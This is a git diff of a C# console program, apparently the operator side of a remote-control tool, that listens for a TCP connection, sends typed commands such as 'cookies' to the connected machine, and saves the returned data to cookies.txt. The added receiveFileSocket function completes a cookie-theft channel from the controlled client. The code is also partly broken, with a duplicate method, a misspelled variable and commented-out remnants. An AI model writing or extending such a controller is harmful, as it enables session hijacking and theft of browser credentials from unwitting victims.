@@ -8,7 +8,6 @@ using System.Threading.Tasks;
 using System.Runtime.Remoting.Channels;
 using System.IO;
 using System.Runtime.InteropServices.ComTypes;
-using System.Net.Http;
 
 namespace Control
 {
@@ -24,7 +23,7 @@ namespace Control
             try
             {
 
-                IPAddress address = IPAddress.Parse("192.168.1.100");
+                IPAddress address = IPAddress.Parse("192.168.50.121");
 
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
@@ -35,9 +34,10 @@ namespace Control
                 Console.WriteLine("Waiting for a connection...");
 
 
-                TcpClient tcpclient = listener.AcceptTcpClient();
+                TcpClient tcplient = listener.AcceptTcpClient();
 
-                Console.WriteLine("Connection received from " + tcpclient.RemoteEndPoint);
+                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
+               // Socket socket = listener.AcceptSocket();
 
 
                 while (true)
@@ -46,8 +46,8 @@ namespace Control
                     Console.Write("Enter your command: ");
                     string command = Console.ReadLine();
 
-                    handleCommand(command, tcpclient);
-
+                    // handleCommand(command,socket);
+                    handleCommand(command, tcplient);
                 }
 
             }
@@ -57,9 +57,42 @@ namespace Control
             }
         }
 
-
-        public static void handleCommand(string command,Socket socket)
+        public static void receiveFileSocket(TcpClient client)
         {
+            
+               
+
+                NetworkStream stream = client.GetStream();
+
+                byte[] fileSizeBytes = new byte[4];
+                int bytes = stream.Read(fileSizeBytes, 0, 4);
+                int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);
+
+                int bytesLeft = dataLength;
+                byte[] data = new byte[dataLength];
+
+                int bufferSize = 1024;
+                int bytesRead = 0;
+
+            while (bytesLeft > 0)
+            {
+                int curDataSize = Math.Min(bufferSize, bytesLeft);
+                if (client.Available < curDataSize)
+                    curDataSize = client.Available; //This saved me
+
+                bytes = stream.Read(data, bytesRead, curDataSize);
+
+                bytesRead += curDataSize;
+                bytesLeft -= curDataSize;
+
+            }
+                FileStream fs = new FileStream("cookies.txt", FileMode.OpenOrCreate);
+                fs.Write(data, 0, dataLength);
+                fs.Close();
+         }    
+        public static void handleCommand(string command,TcpClient client )
+        {
+            Socket socket = client.Client;
             command = command.Trim().ToLower();
             if(command == "clear")
             {
@@ -80,9 +113,11 @@ namespace Control
                 socket.Send(encoding.GetBytes("cookies"));
                 Console.WriteLine("Sending request get cookies...");
 
-                byte[] data = new byte[BUFFER_SIZE];
-                socket.Receive(data);
-                Console.WriteLine("Client: " + encoding.GetString(data));
+               // byte[] data = new byte[BUFFER_SIZE];
+                //socket.Receive(data);
+
+                receiveFileSocket(client);
+               // Console.WriteLine("Client: " + encoding.GetString(data));
 
                 //byte[] buffer = new byte[1024];
                 //int bytesRead = stream.Read(buffer, 0, buffer.Length);
@@ -114,35 +149,42 @@ namespace Control
         {
 
         }
-        public static void receiveFileSocket(TcpClient tcpclient)
+        public static void receiveFileSocket( Socket socket)
         {
-         
-            NetworkStream stream = tcpclient.GetStream();
-            byte[] fileSizeBytes = new byte[4];
-            int bytes = stream.Read(fileSizeBytes, 0, 4);
-            int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);
+            //Console.Write("Waiting for a connection... ");
 
-            int bytesLeft = dataLength;
-            byte[] data = new byte[dataLength];
+            //// Perform a blocking call to accept requests.
+            //// You could also use server.AcceptSocket() here.
+            //TcpClient client = server.AcceptTcpClient();
+            //Console.WriteLine("Connected!");
 
-            int bufferSize = 1024;
-            int bytesRead = 0;
+            //NetworkStream stream = socket.GetStream();
 
-            while (bytesLeft > 0)
-            {
-                int curDataSize = Math.Min(bufferSize, bytesLeft);
-                if (client.Available < curDataSize)
-                    curDataSize = client.Available; //This saved me
+            //byte[] fileSizeBytes = new byte[4];
+            //int bytes = stream.Read(fileSizeBytes, 0, 4);
+            //int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);
 
-                bytes = stream.Read(data, bytesRead, curDataSize);
+            //int bytesLeft = dataLength;
+            //byte[] data = new byte[dataLength];
 
-                bytesRead += curDataSize;
-                bytesLeft -= curDataSize;
-            }
+            //int bufferSize = 1024;
+            //int bytesRead = 0;
 
-            FileStream fs = new FileStream(@"D:\test.jpg", FileMode.OpenOrCreate);
-            fs.Write(data, 0, dataLength);
-            fs.Close()
+            //while (bytesLeft > 0)
+            //{
+            //    int curDataSize = Math.Min(bufferSize, bytesLeft);
+            //    if (client.Available < curDataSize)
+            //        curDataSize = client.Available; //This saved me
+
+            //    bytes = stream.Read(data, bytesRead, curDataSize);
+
+            //    bytesRead += curDataSize;
+            //    bytesLeft -= curDataSize;
+            //}
+
+            //FileStream fs = new FileStream(@"D:\test.jpg", FileMode.OpenOrCreate);
+            //fs.Write(data, 0, dataLength);
+            //fs.Close();
         }
     }
 }
